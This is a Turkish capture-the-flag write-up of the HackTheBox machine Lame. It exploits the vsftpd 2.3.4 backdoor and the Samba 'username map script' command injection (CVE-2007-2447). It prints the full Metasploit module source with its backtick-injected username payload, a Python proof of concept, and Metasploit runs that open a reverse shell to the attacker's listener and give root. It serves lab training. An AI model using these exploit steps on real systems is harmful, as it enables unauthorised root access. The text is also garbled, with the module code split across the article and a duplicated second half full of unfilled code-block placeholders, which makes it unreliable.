---
{"dg-publish":true,"permalink":"/ctf/lame-ctf/"}
---

Lame, HTB'de yayınlanan ilk kutuydu (söyleyebileceğim kadarıyla), ki ben henüz oynamaya başlamadan önceydi. Süper kolay bir kutudur, bir Metasploit script'i ile doğrudan bir root shell'e kolayca devrilebilir. Yine de, OSCP benzeri bazı yönleri var, bu yüzden Metasploit ile ve Metasploit olmadan göstereceğim ve exploitleri analiz edeceğim. Savunmasız bir sürüm olan VSFTPd sunucusuyla bir head-fake atıyor, ancak kutu remote exploitation'a izin vermeyecek şekilde yapılandırılmış. VSFTPd'yi Beyond Root'ta inceleyeceğim.


## Box Info

|Name|[Lame](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flame)[![Lame](https://0xdf.gitlab.io/icons/box-lame.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flame)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flame)|
|---|---|
|Release Date|14 Mar 2017|
|Retire Date|26 May 2017|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Lame](https://0xdf.gitlab.io/img/lame-diff.png)|
|Radar Graph|![Radar chart for Lame](https://0xdf.gitlab.io/img/lame-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|18 days + 22:55:25[![0x1Nj3cT0R](https://www.hackthebox.com/badge/image/22)](https://app.hackthebox.com/users/22)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|18 days + 22:54:36[![0x1Nj3cT0R](https://www.hackthebox.com/badge/image/22)](https://app.hackthebox.com/users/22)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

```
nmap -p- --min-rate 10000 10.10.10.3   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 12:02 EST
Nmap scan report for 10.10.10.3
Host is up (0.15s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```
nmap -sU -p- --min-rate 10000  10.10.10.3 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 12:03 EST
Nmap scan report for 10.10.10.3
Host is up (0.64s latency).
Not shown: 65531 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc
```

```
nmap -p 21,22,139,445,3632 -sV -sC 10.10.10.3 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 12:03 EST
Nmap scan report for 10.10.10.3
Host is up (0.16s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-02-05T12:04:33-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m20s, deviation: 3h32m09s, median: 19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.41 seconds

```

Ubuntu paketleri için kullandığım [link](https://packages.ubuntu.com/search?keywords=openssh-server) openSH'nin bu sürümünü listelemiyor, bu da bu işletim sisteminin gerçekten eski olduğu anlamına geliyor. Google'da biraz arama yapınca bunun muhtemelen [Ubuntu 8.04 Handy Heron](https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1) olduğu ortaya çıktı.


### FTP - TCP 21

#### Anonymous Login

FTP anonim girişlere izin verdiği için kontrol edeyim dedim ama dizin boştu.

#### Exploits

vsftpd 2.3.4 ünlü bir backdoor FTP sunucusudur. Ancak bunu bilmeden bile, vsftpd'nin bu sürümü için bir exploit olduğunu gösterecek olan searchsploit'i kontrol etmeye her zaman değer:

![Pasted image 20250205201132.png](/img/user/resimler/Pasted%20image%2020250205201132.png)

Bunu kesinlikle denemek isteyeceğim.

### SMB - TCP 445

#### Anonymous Login

smbmap, kimlik bilgileri olmadan erişebileceğim yalnızca bir paylaşım gösteriyor:

```
smbmap -H 10.10.10.3
```

![Pasted image 20250205201226.png](/img/user/resimler/Pasted%20image%2020250205201226.png)

smbclient ile /tmp dizinine bağlanma

![Pasted image 20250205201411.png](/img/user/resimler/Pasted%20image%2020250205201411.png)

Eğer bağlanmaz ise ; Client'in güvenlik nedeniyle [eski SMB sürümlerine bağlanmamak üzere ayarlandığı ortaya çıktı](https://www.wombacher.cc/accessing-smb-share-on-old-nas-failed-from-linux/). Aşağıdakileri /etc/samba.smb.conf dosyama ekledim ve sonra sorunsuz çalışıyor:

```
[global] 
client min protocol=NT1
```

Twitter'da r518 bunu bir komut satırı seçeneği olarak da ekleyebileceğimi belirtti:

```
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

Giriş yapacağım, ancak /tmp'ye eşlenmiş gibi göründüğü için içinde ilginç bir şey yok:


#### Exploits

Samba'yı da searchsploit'te kontrol edeceğim:

![Pasted image 20250205201711.png](/img/user/resimler/Pasted%20image%2020250205201711.png)

3.0.19 < 3.0.21 gibi bir şey yazmasına izin vermek için sadece 3.0'ı arayacağım. Umut verici görünen bir şey var:

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
```

Bu, genellikle Samba usermap script olarak adlandırılan CVE-2007-2447'dir.



## VSFTPD Exploit

### Without Metasploit

Bu istismarı LaCasaDePapel writeup'ımda yazdım. FTP'ye bağlanıp kullanıcı adının sonuna `:)` ekleyerek tetiklenebiliyor. nc ile deneyeceğim.

VSFTPD 2.3.4'teki bu güvenlik açığı, geliştiricinin resmi sürümüne eklenmemiş kötü amaçlı bir backdoor içeren bir binary dosyanın dağıtılmasıyla ortaya çıkmıştır. Bu sürümde, belirli bir kullanıcı adı deseni kullanıldığında bir reverse shell başlatan bir backdoor bulunuyordu.

### **Zafiyetin Detayları**

- **Etkilenen Yazılım:** VSFTPD 2.3.4
- **Zafiyet Türü:** Backdoor
- **CVE:** CVE-2011-2523

Bu sürümde, FTP sunucusuna giriş yaparken **kullanıcı adı sonunda `:)`** karakterleri varsa, arka kapı mekanizması devreye girer. Bunun sonucunda, **TCP bağlantı noktasında (`port 6200`) bir reverse shell açılır**.

![Pasted image 20250205202940.png](/img/user/resimler/Pasted%20image%2020250205202940.png)

![Pasted image 20250205202947.png](/img/user/resimler/Pasted%20image%2020250205202947.png)


### With Metasploit

Bu exploiti yeterince anladım ve Metasploit'te de farklı olmayacağını biliyorum, ancak burada gösterebilirim. msfconsole'u başlatıp aratacağım:

![Pasted image 20250205203137.png](/img/user/resimler/Pasted%20image%2020250205203137.png)

Onu kullanacağım ve hedefi belirleyeceğim:

Payload'u `cmd/unix/interact` olarak ayarlayın ve çalıştırın:

![Pasted image 20250205203309.png](/img/user/resimler/Pasted%20image%2020250205203309.png)

![Pasted image 20250205203411.png](/img/user/resimler/Pasted%20image%2020250205203411.png)

Yine de başarısız oluyor.

Bunun neden başarısız olduğunu Beyond Root'ta inceleyeceğim.


## SAMBA Exploit

### Tamamen Manuel

#### Script Analysis

Neler olduğunu anlamak için, exploit'in kaynağını alacağım:

![Pasted image 20250205203622.png](/img/user/resimler/Pasted%20image%2020250205203622.png)

Oldukça kısa:

```
##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::SMB

        # For our customized version of session_setup_ntlmv1
        CONST = Rex::Proto::SMB::Constants
        CRYPT = Rex::Proto::SMB::Crypt

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Samba "username map script" Command Execution',
                        'Description'    => %q{
                                        This module exploits a command execution vulnerability in Samba
                                versions 3.0.20 through 3.0.25rc3 when using the non-default
                                "username map script" configuration option. By specifying a username
                                containing shell meta characters, attackers can execute arbitrary
                                commands.

                                No authentication is needed to exploit this vulnerability since
                                this option is used to map usernames prior to authentication!
                        },
                        'Author'         => [ 'jduck' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 10040 


Önemli kısım en alttaki ==def exploit'te==. kullanarak bir SMB oturumu oluşturuyor:

```
kullanıcıadı = `/=nohup [payload]`
şifre = rastgele 16 karakter
domain = kullanıcı tarafından sağlanan domain
```


```
Yani temel olarak Linux'ta  ` `  ifadeleri, komutu çalıştırıp çıktısını yerine koymak için kullanılır, tıpkı `$()` gibi. Görünüşe göre Samba, bunu kullanıcı adı içinde yapmaya izin veriyor. Metasploit ise `nohup` (komutu mevcut bağlamın dışında çalıştıran bir araç) kullanarak ardından bir payload çalıştırıyor.
```


#### smbclient Fails

Bunu smbclient ile deneyeceğim. 443'te bir nc listener başlatacağım. Paylaşıma smbclient //10.10.10.3/tmp kullanarak bağlanabiliyorum. Önce bir kullanıcı belirtmeyi denedim:

![Pasted image 20250205204058.png](/img/user/resimler/Pasted%20image%2020250205204058.png)

![Pasted image 20250205204359.png](/img/user/resimler/Pasted%20image%2020250205204359.png)

listener'la bir bağlantı kurdum:

![Pasted image 20250205204407.png](/img/user/resimler/Pasted%20image%2020250205204407.png)

```
Ne yazık ki, bu benim local kutumdan. Bash'ım bağlantıyı göndermeden önce    ` ` komutunu çalıştırıyor. “ ile ' yi değiştireceğim:
```

Bazı nedenlerden dolayı, komutun başlangıcı büyük harfle yazılıyor ve bu da yürütmeyi bozuyor.

![Pasted image 20250205204531.png](/img/user/resimler/Pasted%20image%2020250205204531.png)


#### smbclient success

Görünüşe göre smbclient üzerinden giriş yapmanın başka bir yolu daha var ve bu, logon komutuyla bağlandıktan sonra kullanıcıları değiştirmek için kullanılıyor (şifre sorulduğunda sadece enter tuşuna basıyorum):

![Pasted image 20250205204711.png](/img/user/resimler/Pasted%20image%2020250205204711.png)

![Pasted image 20250205204728.png](/img/user/resimler/Pasted%20image%2020250205204728.png)

### Python Script

Biraz Google araması beni bu açık için bir Python POC içeren bu GitHub'a yönlendirdi. “ Install” talimatlarını izleyerek ve ardından scripti çalıştırarak kolayca bir shell elde edebilirim:

![Pasted image 20250205204847.png](/img/user/resimler/Pasted%20image%2020250205204847.png)

```
root@kali# python usermap_script.py 10.10.10.3 139 10.10.16.9 443
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

Elbette, Lame'den bir shell aldım:

```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:44666.
id
uid=0(root) gid=0(root)
```


### With Metasploit

Bunu Metasploit ile de yapabilirim

```
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf5 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.16.9
msf5 exploit(multi/samba/usermap_script) > set lport 443
lport => 443
```


```
msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.24:443 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo zchdJVWjFG8sP3T3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "zchdJVWjFG8sP3T3\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.9:443 -> 10.10.10.3:37959) at 2019-02-28 08:52:31 -0500

‍id
uid=0(root) gid=0(root)
```


### Shell as Root
Bu yöntemlerden herhangi biriyle bir shell ile, daha güzel bir shell elde etmek için python ve pty kullanabilirim:

```
‍python -c 'import pty; pty.spawn("bash")' 
```

çalışmadı python yüklü olmayabilir !!

```
which python
/usr/bin/python
```

fakat bu şekilde çalıştırdığımda çalıştı . 

```
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

Sonra da bayrakları al:

![Pasted image 20250205205904.png](/img/user/resimler/Pasted%20image%2020250205205904.png)


## Beyond Root - VSFTPd

Peki VSFTPd'ye ne oldu? Kutuyu nmap ile ilk taradığımda, dört açık TCP portu gösterdi: FTP (21), SSH (22), Samba (139, 445) ve 3632'de bir şey. Ancak bir shell ile çok daha fazla listener görebildim:

![Pasted image 20250205210002.png](/img/user/resimler/Pasted%20image%2020250205210002.png)

Firewall çok fazla engelleme yapıyor olmalı.

Bu, backdoor tetiklenirse ve 6200'de dinlemeye başlarsa, muhtemelen hostumdan erişilemeyeceği anlamına gelir. Test edeceğim. Gösterim amacıyla, kutudaki kullanıcıya geçeceğim, makis:

```
root@lame:/etc# su - makis -c bash
makis@lame:~$ nc 127.0.0.1 6200
(UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused
```

Backdoor'a bağlanamıyorum. Backdoor'u tekrar tetiklediğimde, şimdi bağlanabiliyorum ve root olarak bir shell alabiliyorum:

```
makis@lame:~$ nc 127.0.0.1 6200
‍id
uid=0(root) gid=0(root)
```

Portun artık dinlediğini görebiliyorum:

```
root@lame:/etc# netstat -tnlp | grep 6200
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd 
```

[Lame distcc + Privesc »](https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html)

,
                        'References'     =>
                                [
                                        [ 'CVE', '2007-2447' ],
                                        [ 'OSVDB', '34700' ],
                                        [ 'BID', '23972' ],
                                        [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
                                        [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
                                ],
                        'Platform'       => ['unix'],
                        'Arch'           => ARCH_CMD,
                        'Privileged'     => true, # root or nobody user
                        'Payload'        =>
                                {
                                        'Space'    => 1024,
                                        'DisableNops' => true,
                                        'Compat'      =>
                                                {
                                                        'PayloadType' => 'cmd',
                                                        # *_perl and *_ruby work if they are installed
                                                        # mileage may vary from system to system..
                                                }
                                },
                        'Targets'        =>
                                [
                                        [ "Automatic", { } ]
                                ],
                        'DefaultTarget'  => 0,
                        'DisclosureDate' => 'May 14 2007'))

                register_options(
                        [
                                Opt::RPORT(139)
                        ], self.class)
        end


        def exploit

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end

end
```


Önemli kısım en alttaki ==def exploit'te==. kullanarak bir SMB oturumu oluşturuyor:

{{CODE_BLOCK_8}}


{{CODE_BLOCK_9}}


#### smbclient Fails

Bunu smbclient ile deneyeceğim. 443'te bir nc listener başlatacağım. Paylaşıma smbclient //10.10.10.3/tmp kullanarak bağlanabiliyorum. Önce bir kullanıcı belirtmeyi denedim:

![Pasted image 20250205204058.png](/img/user/resimler/Pasted%20image%2020250205204058.png)

![Pasted image 20250205204359.png](/img/user/resimler/Pasted%20image%2020250205204359.png)

listener'la bir bağlantı kurdum:

![Pasted image 20250205204407.png](/img/user/resimler/Pasted%20image%2020250205204407.png)

{{CODE_BLOCK_10}}

Bazı nedenlerden dolayı, komutun başlangıcı büyük harfle yazılıyor ve bu da yürütmeyi bozuyor.

![Pasted image 20250205204531.png](/img/user/resimler/Pasted%20image%2020250205204531.png)


#### smbclient success

Görünüşe göre smbclient üzerinden giriş yapmanın başka bir yolu daha var ve bu, logon komutuyla bağlandıktan sonra kullanıcıları değiştirmek için kullanılıyor (şifre sorulduğunda sadece enter tuşuna basıyorum):

![Pasted image 20250205204711.png](/img/user/resimler/Pasted%20image%2020250205204711.png)

![Pasted image 20250205204728.png](/img/user/resimler/Pasted%20image%2020250205204728.png)

### Python Script

Biraz Google araması beni bu açık için bir Python POC içeren bu GitHub'a yönlendirdi. “ Install” talimatlarını izleyerek ve ardından scripti çalıştırarak kolayca bir shell elde edebilirim:

![Pasted image 20250205204847.png](/img/user/resimler/Pasted%20image%2020250205204847.png)

{{CODE_BLOCK_11}}

Elbette, Lame'den bir shell aldım:

{{CODE_BLOCK_12}}


### With Metasploit

Bunu Metasploit ile de yapabilirim

{{CODE_BLOCK_13}}


{{CODE_BLOCK_14}}


### Shell as Root
Bu yöntemlerden herhangi biriyle bir shell ile, daha güzel bir shell elde etmek için python ve pty kullanabilirim:

{{CODE_BLOCK_15}}

çalışmadı python yüklü olmayabilir !!

{{CODE_BLOCK_16}}

fakat bu şekilde çalıştırdığımda çalıştı . 

{{CODE_BLOCK_17}}

Sonra da bayrakları al:

![Pasted image 20250205205904.png](/img/user/resimler/Pasted%20image%2020250205205904.png)


## Beyond Root - VSFTPd

Peki VSFTPd'ye ne oldu? Kutuyu nmap ile ilk taradığımda, dört açık TCP portu gösterdi: FTP (21), SSH (22), Samba (139, 445) ve 3632'de bir şey. Ancak bir shell ile çok daha fazla listener görebildim:

![Pasted image 20250205210002.png](/img/user/resimler/Pasted%20image%2020250205210002.png)

Firewall çok fazla engelleme yapıyor olmalı.

Bu, backdoor tetiklenirse ve 6200'de dinlemeye başlarsa, muhtemelen hostumdan erişilemeyeceği anlamına gelir. Test edeceğim. Gösterim amacıyla, kutudaki kullanıcıya geçeceğim, makis:

{{CODE_BLOCK_18}}

Backdoor'a bağlanamıyorum. Backdoor'u tekrar tetiklediğimde, şimdi bağlanabiliyorum ve root olarak bir shell alabiliyorum:

{{CODE_BLOCK_19}}

Portun artık dinlediğini görebiliyorum:

{{CODE_BLOCK_20}}

[Lame distcc + Privesc »](https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html)

